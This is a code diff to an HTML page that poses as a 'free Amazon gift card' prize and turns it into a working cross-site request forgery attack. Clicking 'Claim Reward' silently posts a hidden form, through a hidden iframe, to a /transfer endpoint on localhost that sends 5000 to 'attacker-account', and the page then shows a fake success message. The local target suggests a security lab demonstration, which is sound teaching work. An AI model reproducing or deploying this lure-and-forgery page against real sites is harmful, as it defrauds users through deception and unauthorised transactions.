@@ -21,6 +21,17 @@
       cursor: pointer;
       font-size: 18px;
     }
+
+    #message {
+      display: none;
+      margin-top: 30px;
+      font-size: 24px;
+      color: #34d399;
+    }
+
+    iframe {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -28,9 +39,37 @@
 <h1>Congratulations!</h1>
 <p>You won a FREE Amazon Gift Card!</p>
 
-<a href="attack.html">
-  <button>Claim Reward</button>
-</a>
+<button onclick="claimReward()">Claim Reward</button>
+
+<p id="message">✅ Reward Claimed Successfully!</p>
+
+<!-- Hidden iframe -->
+<iframe name="hiddenFrame"></iframe>
+
+<!-- Hidden form -->
+<form id="csrfForm"
+      action="http://localhost:3000/transfer"
+      method="POST"
+      target="hiddenFrame">
+
+  <input type="hidden" name="to" value="attacker-account">
+  <input type="hidden" name="amount" value="5000">
+
+</form>
+
+<script>
+  function claimReward() {
+
+    // submit request silently
+    document.getElementById("csrfForm").submit();
+
+    // hide button
+    document.querySelector("button").style.display = "none";
+
+    // show success message
+    document.getElementById("message").style.display = "block";
+  }
+</script>
 
 </body>
 </html>
